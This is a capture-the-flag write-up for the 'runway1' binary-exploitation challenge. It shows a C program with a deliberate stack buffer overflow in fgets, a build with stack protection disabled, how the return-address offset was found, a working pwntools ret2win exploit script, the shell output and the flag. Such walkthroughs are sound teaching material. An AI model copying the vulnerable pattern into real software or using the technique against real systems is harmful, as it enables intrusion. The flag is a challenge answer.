# runway1

The following `runway1.c` file was provided:

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <fcntl.h>
#include <sys/sendfile.h>

int win() {
    printf("You win! Here is your shell:\n");

    system("/bin/sh");
}

int get_favorite_food() {
    char food[64];

    printf("What is your favorite food?\n");
    fflush(stdout);

    fgets(food, 100, stdin);

    printf("Hmmm..... %s...", food);
}

int main() {
    int rand_num;

    srand(time(0));
    rand_num = rand() % 100;

    get_favorite_food();

    if (rand_num <= 50) {
        printf("That sounds delicious!\n");
    } else if (rand_num <= 70) {
        printf("Eh, that sounds okay.\n");
    } else if (rand_num <= 80) {
        printf("That's my favorite food too!\n");
    } else if (rand_num <= 90) {
        printf("I've never tried that before!\n");
    } else if (rand_num <= 100) {
        printf("Ew! I would never eat that.\n");
    }

    return 0;
}
```

The issue here lies with the `fgets` call in `get_favorite_food()`. It allows 100 bytes of input when `food` is only 64 bytes. 
This is a basic example of a `ret2win` pwn challenge. Since the return address of the function is stored onthe stack, it can be
overwritten to point to some other function. To be able to do this, we need to make sure that there is no canry enabled, which would
halt the program. Luckily, the povided `Makefile` has the following:
```makefile
all: runway1.c
        gcc runway1.c -o runway1 -fno-stack-protector -no-pie -m32
```

This is extremely convenient. Not only is the canary disabled with `-fno-stack-protector`, but `-no-pie` is enabled, which means that the address 
of functions will be the same across runs, meaning that we don't need to do any tricks like leaking libc.
The `-m32` option just means that this is compiled as a 32-bit executable, which for this challenge is not so important but it does mean that each 
address is 4 bytes.

The first step to build our exploit is to find the offset to the return address within `get_favorite_food()`. Many people use `pwntools`' `cyclic` feature
to handle this, but I think it's easier to just use [this website](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) with `pwndbg` for `gdb`.

There's no need to set a breakpoint for this, I just ran the program, entered the cyclic string from that website, and `pwndbg` returned

> Invalid address 0x63413563

Pasting that address into the website from before, I got the offset `76`.

From here, the exploit is rather straightforward:
```python
import pwn

pwn.context.binary = elf = pwn.ELF("./runway1")

if pwn.args.REMOTE:
    io = pwn.remote("challs.pwnoh.io", 13401)
else:
    io = pwn.process("./runway1")


win = elf.symbols['win']

io.recvuntil(b'food?\n')
payload = b'A' * 76 + win.to_bytes(4, "little")

io.sendline(payload)
io.interactive()
```


And running it, we get this:
```
# python3 sender.py REMOTE SILENT
$ ls
flag.txt
run
$ cat flag.txt
bctf{I_34t_fl4GS_4_bR34kf4st_7c639e33ffcfe8c2}
```

Giving the flag `bctf{I_34t_fl4GS_4_bR34kf4st_7c639e33ffcfe8c2}`


